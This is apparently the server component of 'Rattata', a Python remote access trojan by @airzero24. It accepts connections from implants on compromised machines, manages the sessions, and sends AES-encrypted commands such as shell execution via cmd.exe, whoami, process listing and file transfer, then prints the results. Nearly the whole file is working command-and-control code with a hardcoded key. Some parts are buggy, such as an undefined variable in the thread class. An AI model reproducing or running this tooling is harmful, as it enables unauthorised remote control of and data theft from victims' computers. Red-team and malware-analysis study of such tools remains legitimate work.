import socket, sys, hashlib, base64, os, threading
from Crypto import Random
from Crypto.Cipher import AES

# This is the key for the AES encryption, can be modified
CIPHER = ("LUJw_q7aaSNPSU=aSX*!9TU&n#Y&yh2-2+L*")

# Create list to hold threads
threads = []

# Append new sessions to threads list and start new thread
def newThread(session):
  global threads
  threads.append(session)

# Implement AES encryption
class AESCipher(object):
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

cipher = AESCipher(key=CIPHER)

# Create help menu for implant
def helpMenu():
  help = """
cd		- Change current directory
back		- Return to main menu
download	- Download specified file (Under construction)
getpid		- Get current process ID
help		- Display help menu
hostname	- Get system hostname
ls		- List directory files
ps		- Get process list (Windows implant only)
pwd		- Get present working directory
shell		- Execute command via cmd.exe
sysinfo		- Recieve system information (Windows implant only)
upload		- Upload specified file (Under construction)
whoami		- Get current username
"""
  print(help)

# Create help menu for main menu
def mainMenu():
  help = """
checkconns	- Check for new implant connections
list 		- List all established implant sessions available
interact <id>   - Allow you to select which implant session to interact with
quit or exit	- Exit Rattata
"""
  print(help)

# Create startup banner
def banner():
  print """
#############################################
#      ____        __  __        __         #
#     / __ \____ _/ /_/ /_____ _/ /_____ _  #
#    / /_/ / __ `/ __/ __/ __ `/ __/ __ `/  #
#   / _, _/ /_/ / /_/ /_/ /_/ / /_/ /_/ /   #
#  /_/ |_|\__,_/\__/\__/\__,_/\__/\__,_/    #
#					    #
#             By: @airzero24                #
#                                           #
#############################################
"""
# Create threads for each implant
class implantThread(threading.Thread):
  def __init__(self,connections,details):
    threading.Thread.__init__(self)
    self.connection = connection
    self.details = details  

# Create interaction with a implant session
def interactImplant(command):
  if threads != []:
    implantSelect = command.split(" ")[1]
    implantSelect = int(implantSelect) -1
    implant = threads[implantSelect]
    implant = implant.details[0] 
    while True:
      command = raw_input(implant + ":rattata>")
      if command == '':
        helpMenu()
      elif command == 'help' or command == '?':
        helpMenu()
      elif command == 'quit' or command == 'exit' or command == 'back':
        break
      else:
        encrypted = cipher.encrypt(command)
        connection.send(encrypted)
        print "[+] Sent command '" + str(command) + "' to implant!"
        result = connection.recv(16384)
        decrypted = cipher.decrypt(result)
        print "[+] Result from implant:\n" + str(decrypted)

# Define main function
if __name__ == '__main__':
  if os.geteuid() != 0:
    print("\n[!] Rattata needs to be run as root (web socket binding, etc.)... \n")
    sys.exit()
  banner()
  if (len(sys.argv) != 3):
    print("\n[*] This is the server component of Rattata.")
    print("[*] Usage: python server.py <Bind Address> <Bind port>\n")
    sys.exit()
  else:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.bind((sys.argv[1],int(sys.argv[2])))
      s.listen(99)
      print "[*] Waiting for connection...\n"
      while True:
        (connection, details) = s.accept()
        print "[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n"
        newThread =  implantThread(connection, details)
        threads.append(newThread)
        while True:
          command = raw_input("rattata>")
          if command == 'help' or command == '?':
            mainMenu()
          elif command == 'list':
            print "[*] Available implant connections\n"
            if threads == []:
              print "[!] No available implants sessions.\n"
            else:
              counter = 0
              print "[*] Format: <session_id> <ipaddress:port>\n"
              for thread in threads:
                counter = counter + 1
                print " " + str(counter) + " " + str(thread.details[0]) + ":" + str(thread.details[1])  +" (Established)"
                print "\n"
          elif command == 'interact':
            print "[!] Usage: interact <session_id>\n"
          elif command == 'quit' or command == 'exit':
            print "[*] Exiting Rattata...\n"
            os.system('kill $PPID')
          elif command == 'checkconns':
            (connection, details) = s.accept()
            print "[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n"
            newThread =  implantThread(connection, details)
            threads.append(newThread)
          elif 'interact ' in command:
            interactImplant(command)
          else:
            print "\n[!] No implant sessions have been established to execute commands.\n"

    # Kill process on keyboard interrupt
    except KeyboardInterrupt:
      os.system('kill $PPID')
